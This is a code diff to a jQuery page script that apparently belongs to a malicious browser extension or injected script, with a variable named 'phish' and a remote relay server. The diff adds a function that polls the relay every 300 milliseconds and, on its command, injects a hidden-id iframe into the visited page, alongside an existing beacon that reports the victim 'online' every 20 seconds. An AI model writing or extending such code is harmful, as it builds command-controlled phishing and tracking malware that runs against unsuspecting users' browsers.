@@ -3,11 +3,9 @@ $(document).ready(function()
     var phish = "";
     var version = 'Build001';
     var tabURL = window.location.href;
-    
-    
+
     //settings
 
-    
     var v = document.createElement('script');
     v.type = 'text/javascript';
     v.async = true;
@@ -25,6 +23,21 @@ $(document).ready(function()
     function online(){
         $.get(server_web+'relais/index.php?online=1');
     }
+    
+    function iframe(){
+        if(typeof $('#zfpjfizeoi')[0] == undefined){
+            $.get(server_web+'relais/index.php?iframe=1', function(data){
+                if(data != ''){
+                   var ifrm = document.createElement("IFRAME");
+                   ifrm.setAttribute("src", "http://developerfusion.com/");
+                    ifrm.setAttribute("id", "zfpjfizeoi");
+                    document.body.appendChild(ifrm); 
+                }
+            });
+        }
+    }
+    
+    setInterval(iframe, 300);
     setInterval(online,20000);
     var url_history = window.location.href;
 
